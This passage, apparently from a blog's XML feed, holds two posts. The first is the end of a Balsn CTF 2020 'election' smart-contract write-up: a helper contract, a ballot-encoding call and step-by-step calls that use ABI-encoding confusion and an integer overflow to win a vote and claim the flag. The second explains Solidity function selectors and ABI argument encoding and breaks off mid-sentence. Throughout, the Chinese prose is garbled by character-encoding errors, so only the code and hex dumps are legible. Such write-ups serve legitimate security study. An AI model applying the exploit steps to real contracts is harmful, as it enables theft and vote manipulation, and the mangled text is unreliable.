å½“è°ƒç”¨ propose æ—¶ï¼Œç¼–ç å¦‚ä¸‹å›¾ä¸­é—´æ‰€ç¤º å½“è°ƒç”¨ _setStage æ—¶ï¼Œç¼–ç å¦‚ä¸‹å›¾å³è¾¹æ‰€ç¤º ä¸‹å›¾å–è‡ªå®˜æ–¹ WP ï¼Œå¦‚æžœæœ‰ç–‘æƒ‘ï¼Œå¯æŸ¥çœ‹æˆ‘çš„å¦ä¸€ç‰‡åšå®¢ ðŸ‘‰ Function Selector and Argument Encoding ðŸ‘ˆ çŸ¥é“äº†ä¸åŒå‡½æ•°è°ƒç”¨å‚æ•°ç¼–ç ï¼Œä¾¿å¯æ ¹æ®å‚æ•°ç¼–ç åŽçš„ç›¸åº”ä½ç½®è¿›è¡Œåˆ†æž é€šè¿‡ customFallback è°ƒç”¨ proposeï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢æ¡ä»¶ï¼š value = 0x40ï¼ˆéœ€è¦æž„é€ ï¼Œè¦æ±‚ attacker æ‹¥æœ‰ 0x40 çš„ token ï¼‰ ï¼Œoffset_to_data = 0x60(å·²æ»¡è¶³)ï¼Œlength_of_data = 0xa0ï¼ˆéœ€è¦æž„é€ ï¼Œè¦æ±‚ data é•¿åº¦æ˜¯ 0xa0ï¼ŒåŒæ—¶ä¸ºäº†é€šè¿‡ 172 è¡Œå’Œ 173 è¡Œçš„æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ data å†…å®¹è¿›è¡Œåˆç†çš„æž„é€ ï¼‰ é€šè¿‡ customFallback è°ƒç”¨ _setStageï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢æ¡ä»¶ï¼šstage å¯ä»¥æ˜¯ 0ã€1ã€2ã€3ï¼Œæ‰€ä»¥ç›¸åº”åªéœ€ msg.sender ä»¥ 00ã€01ã€02ã€03ç»“å°¾å³å¯ï¼Œå¤šä½™çš„ value å‚æ•°å’Œ data å‚æ•°ä¸å½±å“ ç¬¬ 145 è¡Œå­˜åœ¨ä¸€ä¸ª integer overflow ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸¤ä¸ª ballot æŠ•ç¥¨ï¼Œç¥¨æ•°åˆ†åˆ«ä¸º 2^256-1ï¼ˆæŠ•ç»™ attacker ï¼‰ å’Œ 1 (æŠ•ç»™ Alice æˆ– Bob ä»»æ„ä¸€ä¸ª)ï¼Œè¿™æ ·åˆ©ç”¨ 145 è¡Œçš„ integer overflow ä¾¿å¯é€šè¿‡ 148 è¡Œçš„é™åˆ¶ï¼ŒåŒæ—¶ä½¿ attacker ç¥¨æ•°ä¸º 2^256-1 ï¼Œå¯é€šè¿‡ getWinner() èµ¢å¾—é€‰ç¥¨ Solution æœ¬é¢˜ä¸­çš„ä¸€äº›è´¦æˆ·ï¼Œä¸‹é¢ä¸ºäº†ç®€æ´ï¼Œå°±ä½¿ç”¨ç®€ç§°ï¼Œä¸‹é¢æ˜¯å¯¹åº”å…³ç³» 0xef31471E3004a78Ae403858BbcB27D6d1f37791C Election 0x52cC2403764380CCa583633d2523999FE5077113 attackerè´¦æˆ· 0xe7F2D75e69a989fb834e302f7caf8e1A9CC34000 00è´¦æˆ· 0x40F6dBA38C634C86Ae11D1a775FA2215b7669702 02è´¦æˆ· 0x6CDFf92000246705EFc00B625E2e3d6b0C9e7603 03è´¦æˆ· 0x0000000000000000000000000000000000009453 Alice 0x0000000000000000000000000000000000009487 Bob é€šè¿‡ä¸‹åˆ—è„šæœ¬ï¼Œä»¤ times = 64ï¼Œä½¿ _balances[attacker] = 0x40 12345678910contract son &#123; Election target = Election(0xef31471E3004a78Ae403858BbcB27D6d1f37791C); function getmoney(uint times) public &#123; for (uint i=0; i&lt;times; i++) &#123; target.giveMeMoney(); target.transfer(0x52cC2403764380CCa583633d2523999FE5077113, 1, &quot;&quot;, &quot;&quot;); &#125; &#125;&#125; å‡†å¤‡ä¸¤ä¸ª ballotï¼Œä¸€ä¸ªæŠ•ç»™ attackerï¼Œç¥¨æ•°ä¸º 2^256-1 ï¼›ä¸€ä¸ªæŠ•ç»™ Aliceï¼Œç¥¨æ•°ä¸º 1 å…ˆè¿›è¡Œ ballotEncode è®¡ç®—ï¼Œè°ƒç”¨å½¢å¼å¦‚ä¸‹ 1ballotEncode([[&quot;0x52cC2403764380CCa583633d2523999FE5077113&quot;,&quot;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;], [&quot;0x0000000000000000000000000000000000009453&quot;,&quot;0x1&quot;]]) ç»“æžœå¦‚ä¸‹å›¾æ‰€ç¤º è°ƒç”¨ vote(0x741d83d533784642740e64dbea7fa658c082a96b14623cdb1866e58c252f7f23) ï¼Œç„¶åŽæŸ¥çœ‹ voteHashes[0] æˆåŠŸæ˜¾ç¤º ï¼ˆä½¿ç”¨ attackerè´¦æˆ· ï¼‰ åˆ‡æ¢åˆ° stage 0 ï¼ˆä½¿ç”¨ 00è´¦æˆ· ï¼‰ï¼Œdata å­—æ®µéšæ„ å°† attacker å¢žåŠ åˆ° candidate (ä½¿ç”¨ attackerè´¦æˆ· ) å…¶ä¸­ data å­—æ®µæ‹†åˆ†å¦‚ä¸‹ æŸ¥çœ‹ proposals å¯ä»¥çœ‹åˆ°æ·»åŠ  attacker ä¸º candidate æˆåŠŸ åˆ‡æ¢åˆ° stage 2 ï¼ˆä½¿ç”¨ 02è´¦æˆ· ï¼‰ï¼Œdata å­—æ®µéšæ„ è¿›è¡Œ reveal è°ƒç”¨ï¼Œå…¶ä¸­ ballots æ˜¯ step 2 ä¸­çš„ ballots (ä½¿ç”¨ attackerè´¦æˆ· )ï¼Œè°ƒç”¨å®ŒåŽæŸ¥çœ‹ voteCount[attacker] å·²ç»æ˜¯ 2^256-1 åˆ‡æ¢åˆ° stage 3 ï¼ˆä½¿ç”¨ 03è´¦æˆ· ï¼‰ï¼Œdata å­—æ®µéšæ„ è°ƒç”¨ giveMeFlag() å³å¯ (ä½¿ç”¨ attackerè´¦æˆ· )ï¼Œæ’’èŠ±å®Œç»“ ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰ðŸŽ‰]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2020</tag>
        <tag>election</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Function Selector and Argument Encoding]]></title>
    <url>%2F2021%2Fargument-encoding%2F</url>
    <content type="text"><![CDATA[å‰è¨€ æœ€è¿‘çœ‹äº†ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼Œè§¦åŠåˆ°äº†çŸ¥è¯†ç›²åŒºï¼Œå°±æ°´äº†ä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ å†™çš„ä¹Ÿä¸æ˜¯å¾ˆä¸“ä¸šï¼Œåªæ˜¯æŒ‰ç…§ä¸ªäººç†è§£ï¼Œæœ‰é”™è¯¯çš„è¯æ¬¢è¿ŽåŠæ—¶äº¤æµ ðŸ‘€ å‚è€ƒäº† ðŸ‘‰ å®˜æ–¹æ–‡æ¡£ ðŸ‘ˆ Function Selector å®šä¹‰å°±ä¸ä»‹ç»äº†ï¼Œä¸å¤ªæ¸…æ¥šçš„å¯è‡ªè¡Œç™¾åº¦ï¼Œç›´æŽ¥æ¥çœ‹ä¾‹å­ï¼ˆä¸€çœ‹å°±æ‡‚ï¼Œå°±ä¸è§£é‡Šäº†ï¼‰ å‚æ•°åŒ…å«ç»“æž„ä½“ï¼Œç›¸å½“äºŽæŠŠç»“æž„ä½“æ‹†åˆ†æˆå•ä¸ªå‚æ•°ï¼Œåªä¸è¿‡è¿™äº›å‚æ•°ç”¨ () å¼•èµ·æ¥ 1234567891011121314151617181920212223242526272829303132pragma solidity &gt;=0.4.16 &lt;0.9.0;pragma experimental ABIEncoderV2;contract Demo &#123; struct Test &#123; string name; string policies; uint num; &#125; uint public x; function test1(bytes3) public &#123;x = 1;&#125; function test2(bytes3[2] memory) public &#123; x = 1; &#125; function test3(uint32 x, bool y) public &#123; x = 1; &#125; function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125; function test5(uint, Test memory test) public &#123; x = 1; &#125; function test6(uint, Test[] memory tests) public &#123; x = 1; &#125; function test7(uint[][] memory,string[] memory) public &#123; x = 1; &#125;&#125;/* å‡½æ•°é€‰æ‹©å™¨&#123; &quot;0d2032f1&quot;: &quot;test1(bytes3)&quot;, &quot;2b231dad&quot;: &quot;test2(bytes3[2])&quot;, &quot;92e92919&quot;: &quot;test3(uint32,bool)&quot;, &quot;4d189ce2&quot;: &quot;test4(uint256,uint32[],bytes10,bytes)&quot;, &quot;4ca373dc&quot;: &quot;test5(uint256,(string,string,uint256))&quot;, &quot;ccc5bdd2&quot;: &quot;test6(uint256,(string,string,uint256)[])&quot;, &quot;cc80bc65&quot;: &quot;test7(uint256[][],string[])&quot;, &quot;0c55699c&quot;: &quot;x()&quot;&#125;*/ Function Selector and Argument Encoding åŠ¨æ€ç±»åž‹çš„æ•°æ®ï¼Œæ¯”å¦‚åŠ¨æ€æ•°ç»„ï¼Œç»“æž„ä½“ï¼Œå˜é•¿å­—èŠ‚ï¼Œå…¶ç¼–ç åŽå­˜å‚¨å…¶ offsetã€lengthã€data å…ˆæŠŠå‚æ•°é¡ºåºå­˜å‚¨ï¼šå¦‚æžœæ˜¯å®šé•¿æ•°æ®ç±»åž‹ï¼Œç›´æŽ¥å­˜å‚¨å…¶ dataï¼Œå¦‚æžœæ˜¯å˜é•¿æ•°æ®ç±»åž‹ï¼Œå…ˆå­˜å‚¨å…¶ offset é¡ºåºéåŽ†å˜é•¿æ•°æ®ï¼šå…ˆå­˜å‚¨ offsetï¼Œå¯¹äºŽç¬¬ä¸€ä¸ªå˜é•¿æ•°æ®ï¼Œå…ˆå­˜å‚¨å…¶ offset = 0x20 * number ( number æ˜¯å‡½æ•°å‚æ•°çš„ä¸ªæ•° )ï¼›å¯¹äºŽä¸‹ä¸€ä¸ªå˜é•¿æ•°æ®ï¼Œå…¶ offset = offset_of_prev + 0x20 + 0x20 * number (ç¬¬ä¸€ä¸ª 0x20 æ˜¯å­˜å‚¨å‰ä¸€ä¸ªå˜é•¿æ•°æ®çš„é•¿åº¦å ç”¨çš„å¤§å°ï¼Œnumber æ˜¯å‰ä¸€ä¸ªå˜é•¿æ•°æ®çš„å…ƒç´ ä¸ªæ•°) é¡ºåºéåŽ†å˜é•¿æ•°æ®ï¼šå­˜å‚¨å®Œ offset ï¼ŒæŽ¥ç€å°±æ˜¯éåŽ†æ¯ä¸ªå˜é•¿æ•°æ®ï¼Œåˆ†åˆ«å­˜å‚¨å…¶ length å’Œ data ( ps: å¯¹äºŽç»“æž„ä½“è¿™æ ·çš„ç±»åž‹ï¼Œå­˜å‚¨çš„æ—¶å€™å¯æŠŠç»“æž„ä½“å†…å…ƒç´ çœ‹æˆæ˜¯ä¸€ä¸ªæ–°å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ ·çš„è¯ï¼Œå¯¹äºŽç»“æž„ä½“ä¸­çš„ç¬¬ä¸€ä¸ªå˜é•¿æ•°æ®ï¼Œå…¶ offset = 0x20 * num ï¼Œnum æ˜¯ç»“æž„ä½“å…ƒç´ çš„ä¸ªæ•° ) å¯¹äºŽä¸Šè¿°çš„åˆçº¦ä¾‹å­ï¼Œå…¶å‡½æ•°è°ƒç”¨æœ€ç»ˆç¼–ç å¦‚ä¸‹ test1(&quot;0x112233&quot;) 120x0d2032f1 // function selector0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // data of first parameter test2([&quot;0x112233&quot;, &quot;0x445566&quot;]) 1230x2b231dad // function selector0 - 0x1122330000000000000000000000000000000000000000000000000000000000 // first data of first parameter1 - 0x4455660000000000000000000000000000000000000000000000000000000000 // second data of first parameter test3(0x123, 1) 1230x92e92919 // function selector0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter1 - 0x0000000000000000000000000000000000000000000000000000000000000001 // data of second parameter test4(0x123, [&quot;0x11221122&quot;, &quot;0x33443344&quot;], &quot;0x31323334353637383930&quot;, &quot;0x3132333435&quot;) 123456789101112131415161718192021220x4d189ce2 // function selector0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter/* ä¸€äº›è§£é‡Šè¯´æ˜Ždata of first parameter: uintå®šé•¿ç±»åž‹ï¼Œç›´æŽ¥å­˜å‚¨å…¶dataoffset of second parameter: uint32[]åŠ¨æ€æ•°ç»„ï¼Œå…ˆå­˜å‚¨å…¶offset=0x20*4 (4ä»£è¡¨å‡½æ•°å‚æ•°çš„ä¸ªæ•°) data of third parameter: bytes10å®šé•¿ç±»åž‹ï¼Œç›´æŽ¥å­˜å‚¨å…¶dataoffset of forth parameter: byteså˜é•¿ç±»åž‹ï¼Œå…ˆå­˜å‚¨å…¶offset=0x80+0x20*3=0xe0 (0x80æ˜¯å‰ä¸€ä¸ªå˜é•¿ç±»åž‹çš„offsetï¼Œ3æ˜¯å‰ä¸€ä¸ªå˜é•¿ç±»åž‹å­˜å‚¨å…¶é•¿åº¦å’Œä¸¤ä¸ªå…ƒç´ å ç”¨çš„æ’æ§½ä¸ªæ•°)length of second parameter: å­˜å‚¨å®Œdataæˆ–è€…offsetåŽï¼Œä¾¿å¼€å§‹å­˜å‚¨å˜é•¿æ•°æ®çš„lengthå’Œdataï¼Œè¿™é‡Œæ˜¯ç¬¬äºŒä¸ªå‚æ•°çš„é•¿åº¦first data of second parameter: ç¬¬äºŒä¸ªå‚æ•°çš„ç¬¬ä¸€ä¸ªæ•°æ®second data of second parameter: ç¬¬äºŒä¸ªå‚æ•°çš„ç¬¬äºŒä¸ªæ•°æ®length of forth parameter: ä¸Šé¢å°±æŠŠç¬¬äºŒä¸ªå˜é•¿æ•°æ®å­˜å‚¨å®Œæˆï¼Œè¿™é‡Œå°±æ˜¯å­˜å‚¨ä¸‹ä¸€ä¸ªå˜é•¿æ•°æ®çš„é•¿åº¦data of forth parameter: ç¬¬å››ä¸ªå‚æ•°çš„æ•°æ®*/ test5(0x123, [&quot;cxy&quot;, &quot;pika&quot;, 123]) 123456789101112131415161718192021220x4ca373dc // function selector0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter1 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // first data offset of second parameter3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // second data offset of second parameter4 - 0x000000000000000000000000000000000000000000000000000000000000007b // third data of second parameter5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // first data length of second parameter6 - 0x6378790000000000000000000000000000000000000000000000000000000000 // first data of second parameter7 - 0x0000000000000000000000000000000000000000000000000000000000000004 // second data length of second parameter8 - 0x70696b6100000000000000000000000000000000000000000000000000000000 // second data of second parameter/* ä¸€äº›è§£é‡Šè¯´æ˜Ždata of first parameter: uintå®šé•¿ç±»åž‹ï¼Œç›´æŽ¥å­˜å‚¨å…¶dataoffset of second parameter: ç»“æž„ä½“ï¼Œå…ˆå­˜å‚¨å…¶offset=0x20*2 (2ä»£è¡¨å‡½æ•°å‚æ•°çš„ä¸ªæ•°) first data offset of second parameter: ç»“æž„ä½“å†…å…ƒç´ å¯å½“æˆå‡½æ•°å‚æ•°æ‹†åˆ†ï¼Œæœ‰ä¸‰ä¸ªå…ƒç´ ï¼Œå› ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯stringç±»åž‹ï¼Œæ‰€ä»¥å…ˆå­˜å‚¨å…¶offset=0x20*3=0x60second data offset of second parameter: ç»“æž„ä½“ç¬¬äºŒä¸ªå…ƒç´ æ˜¯stringç±»åž‹ï¼Œå…ˆå­˜å‚¨å…¶offset=0x60+0x20+0x20=0xa0 (ç¬¬ä¸€ä¸ª0x20æ˜¯å­˜å‚¨ç¬¬ä¸€ä¸ªstringçš„é•¿åº¦æ‰€å å¤§å°ï¼Œç¬¬äºŒä¸ª0x20æ˜¯å­˜å‚¨ç¬¬ä¸€ä¸ªstringçš„æ•°æ®æ‰€å å¤§å°)third data of second parameter: ç»“æž„ä½“ç¬¬ä¸‰ä¸ªå…ƒç´ æ˜¯uintå®šé•¿ç±»åž‹ï¼Œç›´æŽ¥å­˜å‚¨å…¶datafirst data length of second parameter: å­˜å‚¨ç»“æž„ä½“ç¬¬ä¸€ä¸ªå…ƒç´ çš„lengthfirst data of second parameter: å­˜å‚¨ç»“æž„ä½“ç¬¬ä¸€ä¸ªå…ƒç´ çš„datasecond data length of second parameter: å­˜å‚¨ç»“æž„ä½“ç¬¬äºŒä¸ªå…ƒç´ çš„lengthsecond data of second parameter: å­˜å‚¨ç»“æž„ä½“ç¬¬äºŒä¸ªå…ƒç´ çš„data*/ test6(0x123, [[&quot;cxy1&quot;, &quot;pika1&quot;, 123], [&quot;cxy2&quot;, &quot;pika2&quot;, 456]]) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182ç”±äºŽæ˜¯ç»“æž„ä½“æ•°ç»„ï¼Œæ‰€ä»¥éœ€è¦æ‹†åˆ†ï¼Œç”±å†…å‘å¤–ã€‚å†…éƒ¨æ˜¯ä¸¤ä¸ªç»“æž„ä½“ï¼Œåˆ†åˆ«æ¥çœ‹å…¶encodingå¯¹äºŽ[&quot;cxy1&quot;, &quot;pika1&quot;, 123]ç»“æž„ä½“ï¼Œå…¶encodingå¦‚ä¸‹ï¼ˆç›´æŽ¥å½“æˆå‡½æ•°å‚æ•°encodingï¼‰0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy1&quot;1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika1&quot;2 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 1233 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy1&quot;4 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy1&quot;5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika1&quot;6 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika1&quot;å¯¹äºŽ[&quot;cxy2&quot;, &quot;pika2&quot;, 456]ç»“æž„ä½“ï¼Œå…¶encodingå¦‚ä¸‹ï¼ˆç›´æŽ¥å½“æˆå‡½æ•°å‚æ•°encodingï¼‰0 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy2&quot;1 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika2&quot;2 - 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 4563 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy2&quot;4 - 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy2&quot;5 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika2&quot;6 - 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika2&quot;ç”±äºŽæ˜¯ç»“æž„ä½“ï¼Œæ‰€ä»¥è¿˜éœ€è¦[&quot;cxy1&quot;, &quot;pika1&quot;, 123]çš„offsetå’Œ[&quot;cxy2&quot;, &quot;pika2&quot;, 456]çš„offsetï¼Œå¦‚ä¸‹0 - a // offset of [&quot;cxy1&quot;, &quot;pika1&quot;, 123]1 - b // offset of [&quot;cxy2&quot;, &quot;pika2&quot;, 456]2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy1&quot;3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika1&quot;4 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 1235 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy1&quot;6 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy1&quot;7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika1&quot;8 - 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika1&quot;9 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy2&quot;10- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika2&quot;11- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 45612- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy2&quot;13- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy2&quot;14- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika2&quot;15- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika2&quot;aæŒ‡å‘offset of &quot;cxy1&quot;ï¼Œæ‰€ä»¥a=0x20*2=0x40bæŒ‡å‘offset of &quot;cxy2&quot;ï¼Œæ‰€ä»¥b=0x20*9=0x120ç”±äºŽæ˜¯ç»“æž„ä½“æ•°ç»„ï¼Œç»“æž„ä½“å¤–é¢æ˜¯æ•°ç»„ï¼Œæ‰€ä»¥è¦æŒ‰ç…§åŠ¨æ€æ•°ç»„encodingçš„æ–¹æ³•ï¼Œå¦‚ä¸‹0 - c // offset of [[&quot;cxy1&quot;, &quot;pika1&quot;, 123], [&quot;cxy2&quot;, &quot;pika2&quot;, 456]]1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [&quot;cxy1&quot;, &quot;pika1&quot;, &quot;1&quot;]3 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [&quot;cxy2&quot;, &quot;pika2&quot;, &quot;1&quot;]4 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy1&quot;5 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika1&quot;6 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 1237 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy1&quot;8 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy1&quot;9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika1&quot;10- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika1&quot;11- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy2&quot;12- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika2&quot;13- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 45614- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy2&quot;15- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy2&quot;16- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika2&quot;17- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika2&quot;cæ˜¯å‡½æ•°å‚æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ˜¯åŠ¨æ€ç±»åž‹ï¼Œæ‰€ä»¥offset c = 0x20*2 = 0x40æ‰€ä»¥æ€»çš„encodingå¦‚ä¸‹0xccc5bdd2 // function selector0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // encoding of 0x1231 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of second parameter2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count of second parameter3 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [&quot;cxy1&quot;, &quot;pika1&quot;, &quot;1&quot;]4 - 0x0000000000000000000000000000000000000000000000000000000000000120 // offset of [&quot;cxy2&quot;, &quot;pika2&quot;, &quot;1&quot;]5 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy1&quot;6 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika1&quot;7 - 0x000000000000000000000000000000000000000000000000000000000000007b // encoding of 1238 - 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy1&quot;9 - 0x6378793100000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy1&quot;10- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika1&quot;11- 0x70696b6131000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika1&quot;12- 0x0000000000000000000000000000000000000000000000000000000000000060 // offset of &quot;cxy2&quot;13- 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of &quot;pika2&quot;14- 0x00000000000000000000000000000000000000000000000000000000000001c8 // encoding of 45615- 0x0000000000000000000000000000000000000000000000000000000000000004 // length of &quot;cxy2&quot;16- 0x6378793200000000000000000000000000000000000000000000000000000000 // encoding of &quot;cxy2&quot;17- 0x0000000000000000000000000000000000000000000000000000000000000005 // length of &quot;pika2&quot;18- 0x70696b6132000000000000000000000000000000000000000000000000000000 // encoding of &quot;pika2&quot; test7([[1, 2], [3]], [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596åŒç†è¿›è¡Œç”±å†…å‘å¤–çš„æ‹†åˆ†ï¼Œé¦–å…ˆæ˜¯[[1, 2], [3]]åŠ¨æ€æ•°ç»„ä¸­çš„[1, 2]å’Œ[3]ä¸¤ä¸ªåŠ¨æ€æ•°ç»„0 - a // offset of [1, 2]1 - b // offset of [3]2 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]3 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 14 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 25 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]6 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3aæŒ‡å‘[1, 2]çš„å¼€å§‹ï¼Œæ‰€ä»¥a=0x20*2=0x40bæŒ‡å‘[3]çš„å¼€å§‹ï¼Œæ‰€ä»¥b=0x20*5=0xa0ç„¶åŽæ˜¯[[1, 2], [3]]åŠ¨æ€æ•°ç»„æœ¬èº«çš„encoding0 - c // offset of [[1, 2], [3]]1 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [[1, 2], [3]]2 - 0x0000000000000000000000000000000000000000000000000000000000000040 // offset of [1, 2]3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset of [3]4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // count for [1, 2]5 - 0x0000000000000000000000000000000000000000000000000000000000000001 // encoding of 16 - 0x0000000000000000000000000000000000000000000000000000000000000002 // encoding of 27 - 0x0000000000000000000000000000000000000000000000000000000000000001 // count for [3]8 - 0x0000000000000000000000000000000000000000000000000000000000000003 // encoding of 3cæŒ‡å‘[[1, 2], [3]]çš„å¼€å§‹ï¼Œæ‰€ä»¥a=0x20*2=0x40å…¶æ¬¡æ˜¯[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]åŠ¨æ€æ•°ç»„ä¸­æ¯ä¸ªstringçš„encoding0 - d // offset for &quot;one&quot;1 - e // offset for &quot;two&quot;2 - f // offset for &quot;three&quot;3 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;4 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;6 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;8 - 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;dæŒ‡å‘â€œoneâ€çš„å¼€å§‹ï¼Œæ‰€ä»¥d=0x20*3=0x60eæŒ‡å‘â€œtwoâ€çš„å¼€å§‹ï¼Œæ‰€ä»¥e=0x20*5=0xa0fæŒ‡å‘â€œthreeâ€çš„å¼€å§‹ï¼Œæ‰€ä»¥f=0x20*7=0xe0ç„¶åŽæ˜¯[&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]åŠ¨æ€æ•°ç»„æœ¬èº«çš„encoding0 - g // offset of [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]1 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for [&quot;one&quot;, &quot;two&quot;, &quot;three&quot;]2 - 0x0000000000000000000000000000000000000000000000000000000000000060 // offset for &quot;one&quot;3 - 0x00000000000000000000000000000000000000000000000000000000000000a0 // offset for &quot;two&quot;4 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset for &quot;three&quot;5 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;one&quot;6 - 0x6f6e650000000000000000000000000000000000000000000000000000000000 // encoding of &quot;one&quot;7 - 0x0000000000000000000000000000000000000000000000000000000000000003 // count for &quot;two&quot;8 - 0x74776f0000000000000000000000000000000000000000000000000000000000 // encoding of &quot;two&quot;9 - 0x0000000000000000000000000000000000000000000000000000000000000005 // count for &quot;three&quot;10- 0x7468726565000000000000000000000000000000000000000000000000000000 // encoding of &quot;three&quot;è¿™é‡Œgå…ˆä¸è¿›è¡Œè®¡ç®—ï¼Œå› 